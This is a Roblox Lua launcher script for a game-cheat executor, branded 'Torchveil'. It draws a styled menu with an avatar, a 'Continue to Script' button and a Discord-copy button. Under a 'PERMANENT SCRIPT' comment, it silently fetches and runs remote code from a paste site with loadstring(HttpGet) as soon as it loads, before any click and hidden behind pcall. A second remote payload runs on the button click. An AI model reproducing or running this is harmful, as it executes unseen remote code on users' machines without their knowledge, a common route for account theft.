local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer

if CoreGui:FindFirstChild("TorchveilGui") then
    CoreGui.TorchveilGui:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TorchveilGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = CoreGui

-- ==================== AUTO DETECT PC OR MOBILE ====================
local isMobile = UserInputService.TouchEnabled

-- Set sizes based on platform
local frameSize = isMobile and UDim2.new(0, 300, 0, 360) or UDim2.new(0, 340, 0, 400)
local avatarSize = isMobile and 95 or 110
local buttonHeight1 = isMobile and 44 or 50
local buttonHeight2 = isMobile and 42 or 48
local profileY = isMobile and 72 or 78
local btn1Y = isMobile and 215 or 235
local btn2Y = isMobile and 295 or 325
local desc1Y = isMobile and 262 or 288
local desc2Y = isMobile and 340 or 375

-- ==================== PERMANENT SCRIPT ====================
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/4jpVjIiBNA/0"))()
    end)
end)

-- ==================== MAIN FRAME ====================
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = frameSize
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
mainFrame.BackgroundTransparency = 0.02
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 16)

local uiStroke = Instance.new("UIStroke", mainFrame)
uiStroke.Thickness = 2.8
uiStroke.Color = Color3.fromRGB(255, 140, 0)

local uiGradient = Instance.new("UIGradient", uiStroke)
uiGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 160, 0)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 160, 0))
})

task.spawn(function()
    while task.wait() do
        for i = 0, 360, 2 do
            uiGradient.Rotation = i
            task.wait(0.012)
        end
    end
end)

-- ==================== TITLE ====================
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 48)
title.Position = UDim2.new(0, 0, 0, 14)
title.BackgroundTransparency = 1
title.Text = "TORCHVEIL"
title.TextColor3 = Color3.fromRGB(255, 160, 0)
title.TextSize = 28
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.Parent = mainFrame

-- Divider
local divider = Instance.new("Frame")
divider.Size = UDim2.new(0.82, 0, 0, 1.5)
divider.Position = UDim2.new(0.09, 0, 0, 62)
divider.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
divider.BorderSizePixel = 0
divider.Parent = mainFrame

-- ==================== PROFILE SECTION ====================
local profileFrame = Instance.new("Frame")
profileFrame.Size = UDim2.new(0, avatarSize, 0, avatarSize)
profileFrame.Position = UDim2.new(0.5, -avatarSize/2, 0, profileY)
profileFrame.BackgroundTransparency = 1
profileFrame.Parent = mainFrame

local avatar = Instance.new("ImageLabel")
avatar.Size = UDim2.new(1, 0, 1, 0)
avatar.BackgroundTransparency = 1
avatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. player.UserId .. "&w=150&h=150"
avatar.Parent = profileFrame

local avatarCorner = Instance.new("UICorner", avatar)
avatarCorner.CornerRadius = UDim.new(1, 0)

local avatarGlow = Instance.new("UIStroke", avatar)
avatarGlow.Thickness = 3
avatarGlow.Color = Color3.fromRGB(255, 140, 0)
avatarGlow.Transparency = 0.4

local usernameLabel = Instance.new("TextLabel")
usernameLabel.Size = UDim2.new(1, 0, 0, 26)
usernameLabel.Position = UDim2.new(0, 0, 1, 10)
usernameLabel.BackgroundTransparency = 1
usernameLabel.Text = "@" .. player.Name
usernameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
usernameLabel.TextSize = 15
usernameLabel.Font = Enum.Font.GothamMedium
usernameLabel.TextXAlignment = Enum.TextXAlignment.Center
usernameLabel.Parent = profileFrame

-- ==================== BUTTON: Continue to Script ====================
local continueBtn = Instance.new("TextButton")
continueBtn.Size = UDim2.new(0.86, 0, 0, buttonHeight1)
continueBtn.Position = UDim2.new(0.07, 0, 0, btn1Y)
continueBtn.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
continueBtn.BackgroundTransparency = 0.28
continueBtn.Text = "Continue to Script"
continueBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
continueBtn.TextSize = 17
continueBtn.Font = Enum.Font.GothamBold
continueBtn.Parent = mainFrame

Instance.new("UICorner", continueBtn).CornerRadius = UDim.new(0, 10)

local continueStroke = Instance.new("UIStroke", continueBtn)
continueStroke.Thickness = 2
continueStroke.Color = Color3.fromRGB(255, 200, 80)

local continueDesc = Instance.new("TextLabel")
continueDesc.Size = UDim2.new(0.86, 0, 0, 32)
continueDesc.Position = UDim2.new(0.07, 0, 0, desc1Y)
continueDesc.BackgroundTransparency = 1
continueDesc.Text = "Switch to Delta Executor for more compatible and better performances."
continueDesc.TextColor3 = Color3.fromRGB(170, 170, 170)
continueDesc.TextSize = 11
continueDesc.Font = Enum.Font.Gotham
continueDesc.TextWrapped = true
continueDesc.TextXAlignment = Enum.TextXAlignment.Center
continueDesc.Parent = mainFrame

continueBtn.MouseEnter:Connect(function()
    TweenService:Create(continueBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {
        BackgroundColor3 = Color3.fromRGB(255, 175, 40),
        BackgroundTransparency = 0.12,
        Size = UDim2.new(0.88, 0, 0, buttonHeight1 + 2)
    }):Play()
    TweenService:Create(continueStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(255, 220, 120)}):Play()
end)

continueBtn.MouseLeave:Connect(function()
    TweenService:Create(continueBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {
        BackgroundColor3 = Color3.fromRGB(255, 140, 0),
        BackgroundTransparency = 0.28,
        Size = UDim2.new(0.86, 0, 0, buttonHeight1)
    }):Play()
    TweenService:Create(continueStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(255, 200, 80)}):Play()
end)

continueBtn.MouseButton1Click:Connect(function()
    continueBtn.Text = "Loading..."
    TweenService:Create(continueBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(255, 200, 80)}):Play()
    
    task.wait(0.5)
    
    pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/Z4g0RhNe/raw"))()
    end)
    
    task.wait(0.3)
    screenGui:Destroy()
end)

-- ==================== BUTTON: Copy Discord ====================
local discordBtn = Instance.new("TextButton")
discordBtn.Size = UDim2.new(0.86, 0, 0, buttonHeight2)
discordBtn.Position = UDim2.new(0.07, 0, 0, btn2Y)
discordBtn.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
discordBtn.BackgroundTransparency = 0.35
discordBtn.Text = "Copy Discord"
discordBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
discordBtn.TextSize = 16
discordBtn.Font = Enum.Font.GothamBold
discordBtn.Parent = mainFrame

Instance.new("UICorner", discordBtn).CornerRadius = UDim.new(0, 10)

local discordStroke = Instance.new("UIStroke", discordBtn)
discordStroke.Thickness = 1.8
discordStroke.Color = Color3.fromRGB(255, 140, 0)

local discordDesc = Instance.new("TextLabel")
discordDesc.Size = UDim2.new(0.86, 0, 0, 28)
discordDesc.Position = UDim2.new(0.07, 0, 0, desc2Y)
discordDesc.BackgroundTransparency = 1
discordDesc.Text = "Copy our Discord server link to get updates, support, and releases."
discordDesc.TextColor3 = Color3.fromRGB(160, 160, 160)
discordDesc.TextSize = 10.5
discordDesc.Font = Enum.Font.Gotham
discordDesc.TextWrapped = true
discordDesc.TextXAlignment = Enum.TextXAlignment.Center
discordDesc.Parent = mainFrame

discordBtn.MouseEnter:Connect(function()
    TweenService:Create(discordBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {
        BackgroundColor3 = Color3.fromRGB(75, 75, 75),
        BackgroundTransparency = 0.18,
        Size = UDim2.new(0.88, 0, 0, buttonHeight2 + 2)
    }):Play()
    TweenService:Create(discordStroke, TweenInfo.new(0.15), {Thickness = 2.5, Color = Color3.fromRGB(255, 180, 60)}):Play()
end)

discordBtn.MouseLeave:Connect(function()
    TweenService:Create(discordBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {
        BackgroundColor3 = Color3.fromRGB(55, 55, 55),
        BackgroundTransparency = 0.35,
        Size = UDim2.new(0.86, 0, 0, buttonHeight2)
    }):Play()
    TweenService:Create(discordStroke, TweenInfo.new(0.15), {Thickness = 1.8, Color = Color3.fromRGB(255, 140, 0)}):Play()
end)

discordBtn.MouseButton1Click:Connect(function()
    local discordLink = "https://discord.gg/jKsNYcbwaY"
    
    if setclipboard then
        setclipboard(discordLink)
        discordBtn.Text = "✓ Copied!"
        TweenService:Create(discordBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(80, 180, 80)}):Play()
        task.wait(1.3)
        discordBtn.Text = "Copy Discord"
        TweenService:Create(discordBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(55, 55, 55)}):Play()
    else
        discordBtn.Text = discordLink
        task.wait(2.5)
        discordBtn.Text = "Copy Discord"
    end
end)

-- Dragging
local dragging, dragStart, startPos
mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(0.5, startPos.X.Offset + delta.X, 0.5, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

print("✅ Torchveil Premium Launcher Loaded! | Platform: " .. (isMobile and "Mobile" or "PC"))
